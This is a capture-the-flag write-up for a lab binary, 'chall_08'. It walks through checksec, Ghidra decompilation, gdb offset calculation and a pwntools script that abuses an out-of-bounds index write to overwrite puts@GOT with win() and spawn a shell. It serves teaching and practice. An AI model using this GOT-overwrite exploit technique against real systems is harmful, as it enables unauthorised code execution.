# &#35; chall_08

#### &#42; execute
```bash
## 1 file
$ ls ./chall_08
./chall_0

$ file ./chall_08
./chall_08: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0e959c23d63a2ce5ffe6717e29b748617fc28d81, for GNU/Linux 3.2.0, not stripped

## memory protection is none
user@pwn:/pwn/sunshine/08$ checksec --file=./chall_08
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   67) Symbols	  No	0		0		./chall_08

## just do echo
$ ./chall_08
AAAAAAAA
hi


```

#### &#42; disassemble using ghidra
```bash
## vulerable point is *(undefined8 *)(target + (long)local_c * 8) = local_18;
## need to overwrite puts got to win()
void main(void)

{
  undefined8 local_18;
  int local_c;
  
  __isoc99_scanf(&DAT_0040200c,&local_c);   # scanf("%d",&local_c);
  __isoc99_scanf(&DAT_0040200f,&local_18);  # scanf("ld",&local_18);
  *(undefined8 *)(target + (long)local_c * 8) = local_18;
  puts("hi");
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}




## exploit structure
puts_got = win()

```


#### &#42; exploit step
```bash
1. find target and puts.got address
2. find distance of target and puts.got
3. input distance
4. overwrite puts.got to target address

```



#### &#42; analysis binary using gdb
```bash
## check to execute using BBBBBB
gef➤  x/2i 0x401060
   0x401060 <puts@plt>:	endbr64
   0x401064 <puts@plt+4>:	bnd jmp QWORD PTR [rip+0x2325]        # 0x403390 <puts@got.plt>
gef➤  x/i 0x403390
   0x403390 <puts@got.plt>:	xor    BYTE PTR [rax],dl
gef➤

gef➤  x/xg 0x4033e0
0x4033e0 <target>:	0x0000000000000000
gef➤

# distance is just -80
gef➤  p/d 0x4033e0-0x403390
$1 = 80
gef➤



```

#### &#42; structure of stack
```bash
first input : -10
secode intput : win()



```

#### &#42; payload(python)
```python
payload  = "-10"
conn.sendline(payload)

payload = str(win)
conn.send(payload)


```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_08'
conn = process(filename)
elf = ELF(filename)

win = elf.symbols["win"]

'''
gef>  x/xg $rcx+$rdx*1
0x4033e8 <target+8>:    0x0000000000000000
gef>  x/2i 0x401060
   0x401060 <puts@plt>: endbr64
   0x401064 <puts@plt+4>:   bnd jmp QWORD PTR [rip+0x2325]        # 0x403390 <puts@got.plt>
gef>  x/xg 0x4033e0
0x4033e0 <target>:  0x0000000000000000
gef>  p/d 0x4033e0-0x403390
$3 = 80
gef>
'''
payload  = "-10"
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

print(win)
payload = str(win)
conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_08' in $PATH, using './chall_08' instead
[+] Starting local process './chall_08': pid 3599
[*] '/pwn/sunshine/08/chall_08'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
4198774
[*] Switching to interactive mode
$
$ cat flag.txt
sun{fiction-fa1a28a3ce2fdd96}
$

```